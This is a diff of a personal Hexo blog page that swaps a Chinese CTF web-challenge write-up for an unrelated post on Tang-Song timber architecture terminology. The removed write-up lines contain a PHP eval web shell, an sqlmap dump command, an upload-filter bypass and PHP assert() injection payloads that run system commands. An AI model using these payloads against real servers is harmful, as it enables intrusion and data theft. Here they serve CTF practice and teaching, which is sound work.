@@ -6,20 +6,32 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://v25bh145.github.io">
-  <title>CTF笔记-WEB攻防-05 | V25bh145的小茶室</title>
+  <title>3.襻间及其铺作-唐宋梁架基础 | V25bh145的小茶室</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。  NewsCenter首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。 接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。 使用sqlmap，搞定。 1python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump">
-<meta name="keywords" content="ctf-web,CTF笔记-WEB攻防">
+  <meta name="description" content="襻间及其铺作斗：  拱：  斗拱：  拱捧节令栱：  如图，记得捧节令栱平行于榑。 栌斗：驼峰上放置的大斗。 替木：捧节令栱的斗上放置，内部贯通的一整根。  单栱造、单栱：在斗上只放置一根横栱，称单栱造，简称单栱。 重栱造、重栱：在斗上放置多根栱，称重栱造，简称重栱。 瓜子栱、瓜栱：单栱的栱称瓜子栱，简称瓜栱。  丁华抹颜栱：并不是脊榑处捧节令栱的特称，而是少数不是栱外形的栱之一。   捧节重栱、">
+<meta name="keywords" content="唐宋梁架基础,中国古代建筑">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF笔记-WEB攻防-05">
-<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2020&#x2F;10&#x2F;14&#x2F;coding&#x2F;ctf&#x2F;ctf%E7%AC%94%E8%AE%B0-05&#x2F;index.html">
+<meta property="og:title" content="3.襻间及其铺作-唐宋梁架基础">
+<meta property="og:url" content="https:&#x2F;&#x2F;v25bh145.github.io&#x2F;2021&#x2F;03&#x2F;08&#x2F;hobbies&#x2F;architecture&#x2F;3.%E8%A5%BB%E9%97%B4%E5%8F%8A%E5%85%B6%E9%93%BA%E4%BD%9C&#x2F;index.html">
 <meta property="og:site_name" content="V25bh145的小茶室">
-<meta property="og:description" content="此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。  NewsCenter首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。 接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。 使用sqlmap，搞定。 1python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump">
+<meta property="og:description" content="襻间及其铺作斗：  拱：  斗拱：  拱捧节令栱：  如图，记得捧节令栱平行于榑。 栌斗：驼峰上放置的大斗。 替木：捧节令栱的斗上放置，内部贯通的一整根。  单栱造、单栱：在斗上只放置一根横栱，称单栱造，简称单栱。 重栱造、重栱：在斗上放置多根栱，称重栱造，简称重栱。 瓜子栱、瓜栱：单栱的栱称瓜子栱，简称瓜栱。  丁华抹颜栱：并不是脊榑处捧节令栱的特称，而是少数不是栱外形的栱之一。   捧节重栱、">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2020-10-21T19:30:55.969Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;vxS4QPt5hmVJ3re.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;ra8TvKhVEpUuRyq.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;3K7FLpZOVaiP8q5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;t83rsRa1q7NmfKz.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;NvYlPDq6pwGdrU1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;lafkyu2CDAdzKmR.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;5bEMad1TWLPCVom.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;nmOUzRigVItPZA6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;wxvteALOoSazC8T.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;2SIWdl48ERuiFqD.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;H3aziYlfx2WsvMV.png">
+<meta property="og:updated_time" content="2021-03-08T06:45:17.962Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2021&#x2F;03&#x2F;08&#x2F;vxS4QPt5hmVJ3re.png">
   
     <link rel="alternative" href="/atom.xml" title="V25bh145的小茶室" type="application/atom+xml">
   
@@ -179,14 +191,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-coding/ctf/ctf笔记-05" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-hobbies/architecture/3.襻间及其铺作" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      CTF笔记-WEB攻防-05
+      3.襻间及其铺作-唐宋梁架基础
     </h1>
   
 
@@ -198,8 +210,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2020/10/14/coding/ctf/ctf%E7%AC%94%E8%AE%B0-05/" class="archive-article-date">
-        <time datetime="2020-10-13T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-14</time>
+<a href="/2021/03/08/hobbies/architecture/3.%E8%A5%BB%E9%97%B4%E5%8F%8A%E5%85%B6%E9%93%BA%E4%BD%9C/" class="archive-article-date">
+        <time datetime="2021-03-08T05:01:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-08</time>
 </a>
 
   
@@ -212,7 +224,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">500字</span>
+      <span class="post-count">509字</span>
     </span>
   </span>
 
@@ -221,7 +233,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">2分</span>
+      <span class="post-count">1分</span>
     </span>
   </span>
 </div>
@@ -232,42 +244,44 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <blockquote>
-<p>此题解系写ctf笔记-08之时熬夜所补，所以篇幅可能略精简，望见谅。</p>
-</blockquote>
-<h1 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686&page=1" target="_blank" rel="noopener">NewsCenter</a></h1><p>首先用dirsearch扫了一遍，什么也没发现，robots.txt也是空的。</p>
-<p>接着尝试使用单引号闭合搜索框，成功，考虑SQL注入。</p>
-<p>使用sqlmap，搞定。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -r postTmp.txt -D news -T secret_table -C fl4g --dump</span><br></pre></td></tr></table></figure>
-
-<a id="more"></a>
-
-<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4822&page=1" target="_blank" rel="noopener">upload1</a></h1><p>看似为webshell上传，上传一个php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="string">"awa"</span>]); <span class="meta">?&gt;</span>php</span><br></pre></td></tr></table></figure>
-
-<p>提示需要使用图片上传，考虑是前端防护，直接打开浏览器调试把”上传”按钮的disable样式去掉，得以上传。</p>
-<p>之后使用菜刀连接，地址为网页返回的上传文件路径，后面的口令填上传的变量名 ($_POST[“awa”]则为awa)</p>
-<p>成功注入后即可随心所欲访问文件，当然flag也在里面。</p>
-<h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002&page=1" target="_blank" rel="noopener">mfw</a></h1><p>首先使用dirsearch进行目录爆破，哦吼，发现一堆.git文件，考虑git泄露。</p>
-<p>使用githacker进行攻击，githacker的具体食用方法见<code>ctf笔记-08</code>中。(原本此处用的是githack，但是其由于不能恢复版本，不推荐使用)</p>
-<p>查看版本，确定只有一个版本之后，开始审计这个版本的代码。</p>
-<p>首先查看flag.php，嗯，在这个git的版本中没东西，看起来需要我们访问现有的flag.php才行。</p>
-<p>开始审计index.php:</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>需要想办法绕过两个’.’，</p>
-<h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a>assert()</h3><p>这道题的漏洞出在assert()中，因为<strong><em>assert()可以执行字符串</em></strong>。</p>
-<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><ol>
-<li><pre><code class="payload">%27.system(&quot;cat%20./templates/flag.php&quot;).%27
-=&gt;
-&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;
-=&gt;
-file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).&apos;.php&apos;)
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. ```payload</span><br><span class="line">   %27)%20or%20phpinfo();%23   # &apos;#&apos;号一定要进行url编码，否则会被忽略掉！</span><br><span class="line">   =&gt;</span><br><span class="line">   &apos;) or phpinfo();#&apos;</span><br><span class="line">   =&gt;</span><br><span class="line">   file_exists(&apos;templates/&apos;) or phpinfo();#.php&apos;)</span><br></pre></td></tr></table></figure>
-</code></pre>
-</li>
-</ol>
-<p><del>flag在HTML的注释中</del></p>
+    <h2 id="襻间及其铺作"><a href="#襻间及其铺作" class="headerlink" title="襻间及其铺作"></a>襻间及其铺作</h2><p><strong>斗</strong>：</p>
+<p><img src="https://i.loli.net/2021/03/08/vxS4QPt5hmVJ3re.png" alt="image-20210308130326948"></p>
+<p><strong>拱</strong>：</p>
+<p><img src="https://i.loli.net/2021/03/08/ra8TvKhVEpUuRyq.png" alt="image-20210308130352809"></p>
+<p><strong>斗拱</strong>：</p>
+<p><img src="https://i.loli.net/2021/03/08/3K7FLpZOVaiP8q5.png" alt="image-20210308130406874"></p>
+<h2 id="拱"><a href="#拱" class="headerlink" title="拱"></a>拱</h2><p><strong>捧节令栱</strong>：</p>
+<p><img src="https://i.loli.net/2021/03/08/t83rsRa1q7NmfKz.png" alt="image-20210308130942845"></p>
+<p>如图，记得<strong>捧节令栱</strong>平行于<strong>榑</strong>。</p>
+<p><strong>栌斗</strong>：<strong>驼峰</strong>上放置的大斗。</p>
+<p><strong>替木</strong>：<strong>捧节令栱</strong>的斗上放置，内部贯通的一整根。</p>
+<hr>
+<p><strong>单栱造、单栱</strong>：在斗上只放置一根横栱，称<strong>单栱造</strong>，简称<strong>单栱</strong>。</p>
+<p><strong>重栱造、重栱</strong>：在斗上放置多根栱，称<strong>重栱造</strong>，简称<strong>重栱</strong>。</p>
+<p><strong>瓜子栱、瓜栱</strong>：单栱的栱称<strong>瓜子栱</strong>，简称<strong>瓜栱</strong>。</p>
+<hr>
+<p><strong>丁华抹颜栱</strong>：并不是脊榑处<strong>捧节令栱</strong>的特称，而是少数不是栱外形的栱之一。</p>
+<p><img src="https://i.loli.net/2021/03/08/NvYlPDq6pwGdrU1.png" alt="image-20210308131413587"></p>
+<hr>
+<p><strong>捧节重栱、慢栱</strong>：在<strong>捧节令栱</strong>的<strong>瓜栱</strong>上方添一根更长的<strong>慢栱</strong>。</p>
+<p><img src="https://i.loli.net/2021/03/08/lafkyu2CDAdzKmR.png" alt="image-20210308131630896"></p>
+<p><strong>丁头栱</strong>：由于使用<strong>慢栱</strong>的缘故，<strong>栿</strong>(图为<strong>平梁</strong>)不再插入<strong>瓜栱</strong>所在的<strong>栌斗</strong>中，此时使用<strong>丁头栱</strong>代替栿与<strong>瓜栱</strong>十字相交。</p>
+<p><img src="https://i.loli.net/2021/03/08/5bEMad1TWLPCVom.png" alt="image-20210308131900206"></p>
+<h2 id="襻-pan-间枋、襻间-简称"><a href="#襻-pan-间枋、襻间-简称" class="headerlink" title="襻(pàn)间枋、襻间(简称)"></a>襻(pàn)间枋、襻间(简称)</h2><p><strong>单材襻间、襻间枋</strong>：</p>
+<p><img src="https://i.loli.net/2021/03/08/nmOUzRigVItPZA6.png" alt="image-20210308143350750"></p>
+<p>​    注：<strong>襻间枋</strong>即是<strong>瓜栱</strong>连起来的样子。</p>
+<p><strong>隔间相闪</strong>：<strong>襻间枋</strong>隔一间设置一根的现象。</p>
+<p><strong>半栱连身对隐、隐刻、影刻</strong>：类似浮雕的做法，在<strong>襻间枋</strong>的内侧刻出栱的样子，也称<strong>隐刻</strong>或<strong>影刻</strong>。</p>
+<p><img src="https://i.loli.net/2021/03/08/wxvteALOoSazC8T.png" alt="image-20210308143720122"></p>
+<hr>
+<p><strong>两材襻间</strong>：<strong>瓜栱</strong>、<strong>慢栱</strong>依次连接。</p>
+<p><img src="https://i.loli.net/2021/03/08/2SIWdl48ERuiFqD.png" alt="image-20210308143850792"></p>
+<p><strong>上下相闪、隔间上下相闪</strong>：同一部件横向延伸并高低错落称<strong>上下相闪</strong>。</p>
+<hr>
+<p><strong>实拍襻间、实拍栱</strong>：<strong>实拍栱</strong>和上方的部件不使用<strong>栱</strong>过渡，直接接<strong>替木</strong>，隔间相闪。</p>
+<p><img src="https://i.loli.net/2021/03/08/H3aziYlfx2WsvMV.png" alt="image-20210308144011531"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>襻间铺作使用<strong>单栱</strong>的做法称<strong>单材襻间</strong>；<strong>隔间上下相闪</strong>，襻间铺作使用<strong>重栱</strong>的做法称<strong>两材襻间</strong>；如<strong>襻间枋</strong>两段制成<strong>实拍栱</strong>的样式，则称<strong>实拍襻间</strong>。</p>
+<p>通常，<strong>看似连为一体的部件，往往在隐藏的地方拼接，在拼缝处没有什么强度。</strong>如平樽在袱的位置断开，节点处很容另损坏。而看<strong>似断开的裙间，在平樽拼缝处探出头，把两段平樽加固在一起。</strong></p>
 
     
 
@@ -282,7 +296,7 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="https://v25bh145.github.io/2020/10/14/coding/ctf/ctf笔记-05/" title="CTF笔记-WEB攻防-05" target="_blank">https://v25bh145.github.io/2020/10/14/coding/ctf/ctf笔记-05/</a>
+          <a href="https://v25bh145.github.io/2021/03/08/hobbies/architecture/3.襻间及其铺作/" title="3.襻间及其铺作-唐宋梁架基础" target="_blank">https://v25bh145.github.io/2021/03/08/hobbies/architecture/3.襻间及其铺作/</a>
         </li>
         
         <li>
@@ -304,11 +318,11 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color3">ctf-web</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">唐宋梁架基础</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">CTF笔记-WEB攻防</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color2">中国古代建筑</a>
         		</li>
       		
 		</ul>
@@ -327,18 +341,9 @@ file_exists(&apos;templates/&apos;.system(&quot;cat ./templates/flag.php&quot;).
 
 <nav id="article-nav">
   
-    <a href="/2020/10/15/coding/ctf/ctf%E7%AC%94%E8%AE%B0-06/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          CTF笔记-WEB攻防-06
-        
-      </div>
-    </a>
   
-  
-    <a href="/2020/10/11/coding/ctf/ctf%E7%AC%94%E8%AE%B0-04/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">CTF笔记-WEB攻防-04</div>
+    <a href="/2021/03/03/hobbies/history/%E5%85%A8%E7%90%83%E9%80%9A%E5%8F%B2/19.%E4%B8%AD%E4%B8%9C%E4%B8%8E%E5%8D%B0%E5%BA%A6/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">19.中东与印度-全球通史</div>
       <i class="icon-circle-right"></i>
     </a>
   
